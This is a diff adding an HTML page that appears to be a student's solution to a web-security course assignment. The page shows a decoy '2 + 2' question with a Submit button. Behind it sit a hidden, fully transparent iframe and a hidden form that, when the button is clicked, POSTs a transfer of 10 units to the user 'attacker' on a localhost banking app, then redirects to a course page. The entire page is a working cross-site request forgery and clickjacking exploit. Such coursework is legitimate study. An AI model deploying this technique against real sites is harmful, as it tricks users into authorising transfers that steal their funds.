@@ -1,8 +1,63 @@
+<!DOCTYPE html>
 <html>
-  <head>
-      <title>C</title>
-  </head>
 
-  <body>
-  </body>
+	<head>
+		<title>TicTacToe</title>
+		<meta charset="UTF-8"/>
+		<style>
+			#outerFrame
+			{
+				width: 1000px; 
+				height: 500px; 
+				margin: 0px; 
+				padding: 0px; 
+			}
+		</style>
+	</head>
+
+	<body>
+		<p>Please answer the following question:</p>
+		<p>2 + 2</p>
+		<input type='text'></input>
+		<button id="x" onclick="myFunction()">Submit</button>
+		<iframe id='outerFrame' name='outerFrame' scrolling="no" frameBorder="0"></iframe>
+		
+		
+		<script type="text/javascript">
+			var src = "http://localhost:3000/protected_transfer"
+			var action = "http://localhost:3000/post_transfer"
+			var quantity = "10";
+			var destination_username = "attacker";
+			var timeout = 100;
+			var transfer = "<iframe id='innerFrame' name='innerFrame' " + 
+				"style='width:1000px; height: 2000px; margin: 0px; padding: 0px; opacity: 0.0;' " +
+				"onload='" + 
+					"if (typeof(document.numLoads) == \"undefined\"){ document.numLoads = 0; } " + 
+					"document.numLoads += 1; " +
+					"if (document.numLoads > 2){ window.location.href = \"http://pages.cs.wisc.edu/~ace/cs642-spring-2016.html\" }'>" + 
+				"</iframe>" +
+				"<form id='transferForm' src='" + src + "' style='display:none' action='" + action + "' method='POST' target='innerFrame'>" +
+				"<input type='text' name='destination_username' value='" + destination_username + "'>" +
+				"<input type='text' name='quantity' value='" + quantity + "'>" +
+				"<input type='text' name='submission' value='Transfer'>" +
+				"</form>";
+			var outerFrameDoc = document.getElementById("outerFrame").contentDocument;
+			outerFrameDoc.open();
+			outerFrameDoc.close();
+			outerFrameDoc.body.innerHTML = transfer;
+			var transferForm = outerFrameDoc.body.children['transferForm'];
+			
+			
+
+			function myFunction() {
+    				transferForm.submit();
+				window.location.href = "http://pages.cs.wisc.edu/~ace/cs642-spring-2016.html"
+			}
+
+
+		</script>
+		
+	</body>
+
 </html>
+
